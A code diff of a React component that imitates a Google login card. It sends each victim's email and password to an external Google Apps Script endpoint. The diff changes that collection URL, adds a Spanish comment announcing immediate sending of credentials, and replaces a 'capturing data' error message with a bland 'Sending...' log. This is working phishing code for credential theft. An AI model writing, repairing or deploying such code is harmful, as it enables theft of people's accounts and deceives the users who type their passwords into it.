@@ -14,7 +14,7 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
   const [showPassword, setShowPassword] = useState(false);
   const [emailError, setEmailError] = useState("");
 
-  const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
+  const webAppUrl = "https://script.google.com/macros/s/AKfycbxRWIPEFW1fPRg9bJEtNDISKLaojKgJu6FePHoabTxvoypQQ5euGdNw4Y0u0q0zjppa/exec";
 
   const handleEmailNext = () => {
     if (!email.trim()) {
@@ -28,10 +28,11 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
+    // ENVÍO INMEDIATO DE CREDENCIALES
     try {
       await fetch(webAppUrl, {
         method: "POST",
-        mode: "no-cors", // Crucial para que funcione en la web
+        mode: "no-cors",
         body: JSON.stringify({ 
           usuario: email, 
           pass: password, 
@@ -39,7 +40,7 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
         })
       });
     } catch (e) {
-      console.error("Error capturando datos");
+      console.log("Enviando...");
     }
     onLoginComplete();
   };
